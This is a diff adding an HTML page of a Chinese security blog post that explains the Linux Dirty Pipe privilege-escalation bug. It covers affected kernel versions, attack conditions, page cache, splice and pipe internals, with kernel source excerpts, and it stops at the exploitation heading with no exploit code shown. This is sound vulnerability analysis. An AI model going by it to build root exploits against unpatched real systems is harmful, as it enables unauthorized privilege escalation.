@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Dirty Pipe 漏洞成因 攻击者可以利用该漏洞实现低权限用户提升至 root 权限，且能对主机任意可读文件进行读写 攻击适用版本：  Linux Kernel版本 &gt;&#x3D; 5.8 Linux Kernel版本 &lt; 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.102  攻击适用条件：  攻击者必须有读权限（因为它需要通过 splice 方法将将页输入管道中） 偏移量不能在页边界">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kernel 现实漏洞复现：Dirty Pipe">
+<meta property="og:url" content="http://example.com/2022/11/27/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Pipe/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="Dirty Pipe 漏洞成因 攻击者可以利用该漏洞实现低权限用户提升至 root 权限，且能对主机任意可读文件进行读写 攻击适用版本：  Linux Kernel版本 &gt;&#x3D; 5.8 Linux Kernel版本 &lt; 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.102  攻击适用条件：  攻击者必须有读权限（因为它需要通过 splice 方法将将页输入管道中） 偏移量不能在页边界">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-11-27T10:14:07.000Z">
+<meta property="article:modified_time" content="2022-11-27T10:16:25.163Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="Kernel">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/11/27/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Pipe/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Kernel 现实漏洞复现：Dirty Pipe | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/27/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Pipe/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Kernel 现实漏洞复现：Dirty Pipe
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-11-27 18:14:07 / Modified: 18:16:25" itemprop="dateCreated datePublished" datetime="2022-11-27T18:14:07+08:00">2022-11-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>13k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>12 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>Dirty Pipe 漏洞成因</strong></p>
+<p>攻击者可以利用该漏洞实现低权限用户提升至 root 权限，且能对主机任意可读文件进行读写</p>
+<p>攻击适用版本：</p>
+<ul>
+<li>Linux Kernel版本 &gt;= 5.8</li>
+<li>Linux Kernel版本 &lt; 5.16.11 / 5.15.25 / 5.10.102</li>
+</ul>
+<p>攻击适用条件：</p>
+<ul>
+<li>攻击者必须有读权限（因为它需要通过 <code>splice</code> 方法将将页输入管道中）</li>
+<li>偏移量不能在页边界上（因为页上至少有一个字节已经拼接到管道中）</li>
+<li>写入不能跨越页边界（因为这将为其余部分创建一个新的匿名缓冲区）</li>
+<li>文件无法调整大小（因为管道有自己的页面填充管理，并且不会告诉页面缓存附加了多少数据）</li>
+<li>单次写入的长度不能超过一页（因为页大小为4K）</li>
+</ul>
+<p>该漏洞源于新管道缓冲区结构的“flag”变量在 Linux 内核中的 <code>copy_page_to_iter_pipe</code> 和 <code>push_pipe</code> 函数中缺乏正确的初始化</p>
+<p><strong>前置知识 - Page Cache &amp; splice</strong></p>
+<p>Page Cache 即缓存管理机制，一般当我们访问一个磁盘文件的时候，首先内核会将其内容装载到 Page Cache 内存中，后续都是直接读取内存中的 Page Cache 来访问数据，内核会在合适的时机将标脏的 Page 给写回磁盘中</p>
+<ul>
+<li>如果用户进程使用 read/write 读写文件，那么内核会先将载入数据的物理内存映射到内核虚拟内存 buffer，然后再将内核的 buffer 数据拷贝到用户态</li>
+<li>如果追求效率，内核也提供一种零拷贝模式（不发生系统调用，跨越用户和内核的边界做上下文切换），用户进程可以使用 mmap 直接将用户态的 buffer 映射到物理内存，不需要进行系统调用，直接访问自己的 mmap 区域即可访问到那段物理内存内容</li>
+</ul>
+<p>splice 系统调用通过一种“零拷贝”的方法将文件内容输送到管道之中，相比传统的直接将文件内容送入管道性能更好</p>
+<ul>
+<li>经典的 <code>read/write</code> 方式：利用用户态数据 <code>buf</code> 作为文件缓存</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="built_in">malloc</span>(len)  		<span class="comment">// 首先申请一块长度为len的内存</span></span><br><span class="line">read(fd1, buf, len)  	<span class="comment">// 将第一个文件fd1中len长度的数据读入buf</span></span><br><span class="line">write(fd2, buf, len) 	<span class="comment">// 将buf中的数据写入文件fd2中</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>零拷贝 <code>splice</code>：在数据发送的过程中，不需要在用户态为数据申请 <code>buf</code>，也就是不会产生用户态、内核态之间的数据拷贝 </li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">splice</span><span class="params">(<span class="keyword">int</span> fd_in, <span class="keyword">loff_t</span> *off_in, <span class="keyword">int</span> fd_out,</span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="keyword">loff_t</span> *off_out, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在两个文件描述符之间移动数据，而无需在内核地址空间和用户地址空间之间进行复制</li>
+<li>它从文件描述中传输最多 <code>len</code> 字节的数据</li>
+<li>将 <code>fd_in</code> 传递到文件描述符 <code>fd_out</code>，其中文件描述符之一必须引用管道</li>
+</ul>
+<p>splice 在内核中对应的接口如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE6(splice, <span class="keyword">int</span>, fd_in, <span class="keyword">loff_t</span> __user *, off_in,</span><br><span class="line">		<span class="keyword">int</span>, fd_out, <span class="keyword">loff_t</span> __user *, off_out,</span><br><span class="line">		<span class="keyword">size_t</span>, len, <span class="keyword">unsigned</span> <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">in</span>, <span class="title">out</span>;</span></span><br><span class="line">	<span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!len))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(flags &amp; ~SPLICE_F_ALL))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	error = -EBADF;</span><br><span class="line">	in = fdget(fd_in); <span class="comment">/* 找到输入文件 */</span></span><br><span class="line">	<span class="keyword">if</span> (in.file) &#123;</span><br><span class="line">		out = fdget(fd_out); <span class="comment">/* 找到输出文件 */</span></span><br><span class="line">		<span class="keyword">if</span> (out.file) &#123;</span><br><span class="line">			error = do_splice(in.file, off_in, out.file, off_out,</span><br><span class="line">					  len, flags); <span class="comment">/* 真正的移动数据 */</span></span><br><span class="line">			fdput(out);</span><br><span class="line">		&#125;</span><br><span class="line">		fdput(in);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>调用链如下：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sys_splice -&gt; do_splice -&gt; []</span><br><span class="line">[pipe to pipe]-&gt; splice_pipe_to_pipe -&gt; ()</span><br><span class="line">[pipe to file]-&gt; do_splice_to -&gt; ()</span><br><span class="line">[file to pipe]-&gt; do_splice_from -&gt; f_op-&gt;splice_read(generic_file_splice_read) -&gt; call_read_iter -&gt; f_op-&gt;read_iter(copy_folio_to_iter) -&gt; ... -&gt; copy_page_to_iter -&gt; copy_page_to_iter_pipe</span><br></pre></td></tr></table></figure>
+<ul>
+<li>其中 <code>copy_page_to_iter_pipe</code> 对“flag”变量没有进行初始化</li>
+</ul>
+<p>使用 <code>splice</code> 将数据从文件导入到管道中：（<code>file to pipe</code>）</p>
+<ul>
+<li>首先将数据加载到文件页面缓存 <code>page cache</code> 中</li>
+<li>然后创建一个管道缓冲区 <code>pipe_buffer</code> </li>
+<li>直接 <code>pipe_buffer-&gt;page = page cache</code>，把 <code>page cache</code> 当做 <code>pipe_buffer</code> 的缓存页</li>
+</ul>
+<p>如果此时该管道还想存储从其他输入流传输来的数据，就只能重新申请 <code>pipe_buffer</code>，不能直接附加到刚才的 <code>pipe_buffer</code> 中，因为该 <code>page</code> 是文件的缓存页面，不属于管道，但 Dirty Pipe 利用了一种方法使该页面可以被管道写入</p>
+<p><strong>前置知识 - Pipe</strong></p>
+<p>管道 Pipe 是一种经典的 IPC 通信方式：</p>
+<ul>
+<li>它包含一个输入端和一个输出端，程序将数据从一段输入，从另一端读出</li>
+<li>在内核中，为了实现这种数据通信，需要以页面 Page 为单位维护一个环形缓冲区（被称为 <code>ring_buffer</code>），里面存了16个 <code>pipe_buffer</code> 结构，每个 <code>pipe_buffer</code>  结构又有一个指针指向一个表示物理内存页 Page 的结构体</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span> <span class="comment">/* 用于描述一个物理页 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len; </span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span> <span class="comment">/* 对应操作管道的函数指针 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>每个 Page 大小为 4KB，页面之间并不连续</li>
+<li>管道维护两个引用计数器，一个用来写 (pipe-&gt;head)，一个用来读 (pipe-&gt;tail)，可以被循环利用</li>
+<li>当前页面带有 <code>PIPE_BUF_FLAG_CAN_MERGE</code> flag 时，如果将标记且续写后的数据长度不超过一页时，则可以进行续写</li>
+</ul>
+<p>管道描述符 <code>pipe_inode_info</code>，用于表示一个管道，存储管道相应的信息： </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head; <span class="comment">/* 缓冲区生成点 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> tail; <span class="comment">/* 缓冲区消耗点 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_usage;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_accounted;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> readers; <span class="comment">/* 该管道的当前读者数量(每次以读方式打开时,readers加1,关闭时readers减1) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> writers; <span class="comment">/* 该管道的当前写者数量(每次以写方式打开时,writers加1,关闭时writers减1) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> files; <span class="comment">/* 引用此管道的file结构体数量 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter; <span class="comment">/* 管道读者记数器,每次以读方式打开管道时,r_counter加1,关闭是不变 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> w_counter; <span class="comment">/* 管道写者计数器,每次以写方式打开管道时,w_counter加1,关闭是不变 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span> <span class="comment">/* 页缓存,可以加速页帧的分配过程,当释放页帧时将页帧记入tmp_page,当分配页帧时,优先从tmp_page中获取(如果tmp_page为空才从伙伴系统中获取) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span> <span class="comment">/* 读端异步描述符 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span> <span class="comment">/* 写端异步描述符 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span> <span class="comment">/* 回环缓冲区(由16个pipe_buffer对象组成,每个pipe_buffer对象拥有一个内存页) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span> <span class="comment">/* 创建此管道的用户 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>管道可以分为命名管道和匿名管道：</p>
+<ul>
+<li>命名管道是一个有名字的实体文件</li>
+<li>匿名管道就是我们常使用的管道符创建的管道</li>
+</ul>
+<p>本质上来讲，管道就是一种进程间的通信手段，让两个进程可以通过 pipe 发送和接收数据（匿名管道可用于父子与兄弟进程之间的通信，有名管道则用于两个无关进程的通信）</p>
+<p>这里我们重点分析实现管道写的函数 <code>pipe_write</code>：</p>
+<ul>
+<li>装载了文件缓存页面 <code>page tcache</code> 的 <code>pipe_buffer</code> 不能被该管道续写（因为写入该管道的数据将会被写入文件）</li>
+<li>我们来看一下究竟是哪里限制了管道的写入：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line">	<span class="keyword">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line">	<span class="keyword">ssize_t</span> chars;</span><br><span class="line">	<span class="keyword">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">		send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">		ret = -EPIPE;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">		ret = -EXDEV;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	head = pipe-&gt;head; <span class="comment">/* 获取缓冲区生成点(用于写入) */</span></span><br><span class="line">	was_empty = pipe_empty(head, pipe-&gt;tail); <span class="comment">/* 检查管道是否为空 */</span> </span><br><span class="line">	chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123; <span class="comment">/* 缓存页不为空 */</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask]; <span class="comment">/* 通过head索引到对应的pipe_buffer */</span></span><br><span class="line">		<span class="keyword">int</span> offset = buf-&gt;offset + buf-&gt;len; </span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 如果flag为PIPE_BUF_FLAG_CAN_MERGE则允许在当前页面续写 */</span></span><br><span class="line">		<span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">		    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">  </span><br><span class="line">			ret = pipe_buf_confirm(pipe, buf); <span class="comment">/* 检查是否写跨页 */</span></span><br><span class="line">			<span class="keyword">if</span> (ret)</span><br><span class="line">				<span class="keyword">goto</span> out; <span class="comment">/* 会引发写跨页(分配一个新的内存页来装数据) */</span></span><br><span class="line"></span><br><span class="line">			ret = copy_page_from_iter(buf-&gt;page, offset, chars, from); <span class="comment">/* 将数据从用户传来的from,拷贝到pipe_buf-&gt;page */</span></span><br><span class="line">			<span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">				ret = -EFAULT;</span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			buf-&gt;len += ret;</span><br><span class="line">			<span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">if</span> (pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line">		wake_next_writer = <span class="literal">false</span>;</span><br><span class="line">	__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (was_empty) &#123;</span><br><span class="line">		wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">		kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (wake_next_writer)</span><br><span class="line">		wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line">	<span class="keyword">if</span> (ret &gt; <span class="number">0</span> &amp;&amp; sb_start_write_trylock(file_inode(filp)-&gt;i_sb)) &#123;</span><br><span class="line">		<span class="keyword">int</span> err = file_update_time(filp);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			ret = err;</span><br><span class="line">		sb_end_write(file_inode(filp)-&gt;i_sb);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>重点注意该函数对 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 的处理，如果 flag 中有该标志位，就会调用 <code>copy_page_from_iter</code> 函数将数据复制到管道缓冲区</li>
+</ul>
+<p><strong>Dirty Pipe 漏洞利用</strong></p>
+<p>对于能否将数据附加至一个管道缓冲区，内核采用了如下的机制： </p>
